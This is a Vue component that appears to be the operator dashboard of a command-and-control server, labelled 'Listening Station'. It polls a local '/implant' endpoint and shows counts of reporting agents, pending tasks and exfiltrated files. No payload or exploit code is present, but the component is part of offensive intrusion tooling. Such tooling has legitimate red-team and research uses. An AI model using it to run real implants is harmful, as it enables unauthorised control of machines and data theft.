<template lang="pug">
div
  b-navbar(toggleable='md', type='dark', variant='primary', sticky='')
    b-navbar-brand(href='#') C &amp; C
    b-navbar-toggle(target='nav-collapse')
      b-collapse#nav-collapse(is-nav='')
        b-navbar-nav
          b-nav-item(:to='{ path: "/" }') Home
          b-nav-item(:to='{ path: "/command" }') Command
          b-nav-item(:to='{ path: "/queues" }') Manage Queues
          b-nav-item(:to='{ path: "/fileManager" }') File Manager
          b-nav-item(:to='{ path: "/docs" }') Api Docs
        //- Right aligned nav items
        b-navbar-nav.ml-auto
          b-nav-form
            b-form-input.mr-sm-2(
              size='sm',
              placeholder='Global Search (Not Implemented)'
            )
              b-button.my-2.my-sm-0(size='sm', type='submit')
                | Search

            //- b-nav-item-dropdown(right)
            //- template(slot="button-content"): em User
            //- b-dropdown-item(href="#") Profile
            //- b-dropdown-item(href="#") Sign Out
  router-view
  b-navbar(fixed='bottom', toggleable='sm', type='dark', variant='primary')
    b-collapse#nav-collapse(is-nav='')
      b-navbar-nav
        b-navbar-brand Listening Station 1.0
        b-nav-item
          | Agents Reporting
          b-badge {{ agentCount }}
        b-nav-item
          | Pending Tasks
          b-badge {{ pendingTaskCount }}
        b-nav-item
          | Files Collected
          b-badge {{ exfiltratedFileCount }}
</template>

<script>
import {
  BBadge,
  BButton,
  BCollapse,
  BFormInput,
  BNavbar,
  BNavbarBrand,
  BNavbarNav,
  BNavbarToggle,
  BNavForm,
  BNavItem
} from 'bootstrap-vue'

export const mountPoint = '#app'

export default {
  name: 'App',
  components: {
    BBadge,
    BButton,
    BCollapse,
    BFormInput,
    BNavbar,
    BNavbarBrand,
    BNavbarNav,
    BNavbarToggle,
    BNavForm,
    BNavItem
  },
  props: {
    endpoint: {
      type: String,
      default: 'https://localhost:5001'
    }
  },
  data() {
    return {
      agents: [],
      tasks: [],
      files: []
    }
  },
  computed: {
    agentCount() {
      return this.agents.length
    },
    pendingTaskCount() {
      return this.tasks.length
    },
    exfiltratedFileCount() {
      return this.files.length
    }
  },
  mounted() {
    this.fetchAgents()

    setInterval(() => this.fetchAgents(), 5000)
    setInterval(() => this.updateTasks(), 5000)
    setInterval(() => this.updateFiles(), 5000)
  },
  methods: {
    async fetchAgents() {
      fetch(this.endpoint + '/implant')
        .then((response) => response.json())
        .then((data) => {
          this.agents = data
        })
        .catch((error) => console.error(error))
    },
    async updateTasks() {
      const newTasks = []
      for (let i = 0; i < this.agents.length; i++) {
        const agent = this.agents[i]
        for (let j = 0; j < agent.tasks.length; j++) {
          const task = agent.tasks[j]
          newTasks.push(task)
        }
      }
      this.tasks = newTasks
    },
    async updateFiles() {
      const newFiles = []
      for (let i = 0; i < this.agents.length; i++) {
        const agent = this.agents[i]
        for (let j = 0; j < agent.exfiltratedFiles.length; j++) {
          const file = agent.exfiltratedFiles[j]
          newFiles.push(file)
        }
      }
      this.files = newFiles
    }
  }
}
</script>
